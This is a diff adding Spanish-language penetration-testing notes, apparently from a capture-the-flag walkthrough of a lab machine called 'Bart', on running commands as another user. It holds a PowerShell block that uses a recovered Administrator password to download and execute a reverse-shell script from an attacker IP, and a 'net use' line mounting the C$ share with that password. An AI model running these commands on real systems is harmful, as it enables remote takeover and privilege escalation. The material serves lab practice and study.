@@ -1808,5 +1808,28 @@ La s entra dentro de las funciones y si quieres ver donde va usa l ademas si qui
 
 
 
+### Powershell “run as”
+
+Que quiere decir correr como eso quiere decir que lo vas a correr en la maquina victima vas a correr un comando como otro usuario en el caso de la maquina bart pues como Administrator ya que tenemos el password:
+
+```
+PS C:\Users\Administrator\Documents>
+
+$username = "BART\Administrator"
+$password = "3130438f31186fbaf962f407711faddb"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1') } -Credential $cred -Computer localhost
+
+```
+
+## Net use Montar un file system
+
+Supongo que se puede hacer remoto o local hay que probarlo.
+
+```
+net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
+```
 
 
